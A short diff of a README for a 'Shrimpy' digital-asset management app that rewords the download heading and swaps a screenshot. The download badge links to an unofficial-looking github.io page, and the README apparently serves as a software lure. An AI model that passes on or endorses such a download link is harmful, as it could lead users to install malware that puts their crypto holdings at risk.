@@ -2,7 +2,7 @@
 
 ![Shrimpy Banner](https://gdm-catalog-fmapi-prod.imgix.net/ProductScreenshot/20566172-5a19-4902-bf14-46e45a516994.png?auto=format&q=50)
 
-## 📥 Download Shrimpy for Windows
+## 📥 Download Shrimpy Desktop App
 
 [![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://shrimpy-desktop-app.github.io/.github/Shrimpy)
 
@@ -28,7 +28,7 @@ Whether you are managing a small set of digital assets, overseeing multiple larg
 
 ---
 
-![Shrimpy Interface](https://gdm-catalog-fmapi-prod.imgix.net/ProductScreenshot/20566172-5a19-4902-bf14-46e45a516994.png?auto=format&q=50)
+![Shrimpy Interface](https://gdm-catalog-fmapi-prod.imgix.net/ProductScreenshot/54428c8f-ab4b-4a20-a231-58b7e64adb58.png?auto=format&q=50)
 
 ---
 
